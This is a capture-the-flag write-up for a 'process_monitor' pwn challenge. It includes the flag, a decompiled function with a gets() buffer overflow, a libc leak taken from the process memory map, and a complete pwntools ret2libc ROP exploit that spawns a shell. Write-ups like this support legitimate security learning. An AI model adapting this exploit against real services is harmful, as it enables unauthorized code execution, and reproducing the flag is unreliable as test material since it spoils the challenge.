Author: nordbo
Flag: `EPT{overfl0w_in_th3_m0n1t0r}`

## Solve

The binary gives us 3 options. 
```sh
$ nc io.ept.gg 30001

Menu:
1. List all running processes
2. Get details for a given process
3. Exit
Enter your choice:
```


By listing all running processes we get this
```sh
Enter your choice: 1
USER       PID   COMMAND
ept        1     /bin/sh
ept        7     ./ynetd
ept        206   sh
ept        207   ./process_monitor
```

And by listing details for the `./process_monitor` process we get this
![[img1.png]]
This is the entire virtual memory map of the process, and we can use this info to call functions in libc.

#### Reversing the binary
The `show_process_detail` function is vulnerable to a buffer overflow because of the use of `gets`
```c
void show_process_detail(void)

{
  int iVar1;
  char *pcVar2;
  char local_322 [10];
  char local_318 [512];
  char local_118 [256];
  FILE *local_18;
  uint local_c;
  
  printf("Enter the PID of the process: ");
  gets(local_322);
  local_c = atoi(local_322);
  snprintf(local_118,0x100,"/proc/%d/status",(ulong)local_c);
  local_18 = fopen(local_118,"r");
  if (local_18 == (FILE *)0x0) {
    perror("Could not fetch details");
  }
[...]
```


#### Finding offsett
By sending in a long enough pattern we get a segfault:
![[img2.png]]

Then we find the offsett in pwndbg:
![[img3.png]]
```sh
$ pwn cyclic -l 0x6163696161626961
802
```


#### Parsing libc
The next step was to parse the libc leak into the pwntools script. This took way to much time for me, and the function I created was pretty bad. I basically just called `io.recvline` until i got to the correct line where the libc base was located. I created one for local and one for remote. 
```python
def leaklibc():
    io.recvuntil(b"Enter your choice: ")
    io.sendline(b"1")

    if args.LOCAL:
        processes = b""
        for i in range(98):
            processes += io.recvline()
        find = re.findall(b"\n.*process_monitor.*\n", processes)[0]
        pid = find[len("\nkali       "):len("\nkali       ")+5]
        io.recvuntil(b"Enter your choice: ")
        io.sendline(b"2")
        io.recvuntil(b"Enter the PID of the process: ")
        io.sendline(pid)
        for i in range(16):
            io.recvline()
        
        return int(io.recvline()[:len("7fef1fb60000")], 16)

    else:
        processes = b""
        processes = io.recvline()
        processes += io.recvline()
        processes += io.recvline()
        processes += io.recvline()
        processes += io.recvline()
        processes += io.recvline()
        processes += io.recvline()

        
        pid = processes.split(b"\n")[4][len("ept        "):len("ept        ")+4]
        io.recvuntil(b"Enter your choice: ")
        io.sendline(b"2")
        io.recvuntil(b"Enter the PID of the process: ")
        io.sendline(pid)
        for i in range(16):
            io.recvline()
        return int(io.recvline()[:len("7fef1fb60000")], 16)
```


#### ROP-chain
From there on the solve was pretty standard. I created a ROP-chain with `pop rdi;ret`  `/bin/sh` `ret` and `system`
```python
libc = ELF("/home/kali/ctf/libc-database/db/libc6_2.35-0ubuntu3.4_amd64.so")
rop = ROP(libc)
io = start()

libcaddr = leaklibc()
log.info("Libc leak: " + hex(libcaddr))

libc.address = libcaddr
io.recvuntil(b"Enter your choice: ")
io.sendline(b"2")
io.recvuntil(b"Enter the PID of the process: ")

payload = b"A"*802
payload += p64(libcaddr + rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libcaddr + rop.find_gadget(['ret'])[0])
payload += p64(libc.sym.system)
io.sendline(payload)

io.interactive()
```

By running this we get a shell!
![[img4.png]]


